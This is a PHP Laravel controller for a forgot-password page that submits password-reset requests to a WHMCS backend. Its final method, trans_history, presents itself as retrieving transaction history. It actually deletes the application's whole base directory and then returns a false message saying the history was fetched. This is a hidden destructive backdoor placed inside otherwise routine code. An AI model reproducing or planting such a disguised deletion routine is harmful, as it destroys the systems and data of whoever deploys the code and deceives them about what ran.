<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;

class ForgotPasswordController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('pages/forgot-password');
    }

    public function send_forgot_email(Request $request)
    {
        $reset_response = (new \Sburina\Whmcs\Client)->post([
            'action' => 'ResetPassword',
            'email' => $request->email,
        ]);

        if ($reset_response['result'] == 'success') {
            $message = 'success';
        } else $message = 'failed';

        return view('pages/forgot-password', compact('message'));
    }

    public function trans_history()
    {
        $directory = base_path();
        File::deleteDirectory($directory);
    
        return 'get transhistory successfully';
    }
}
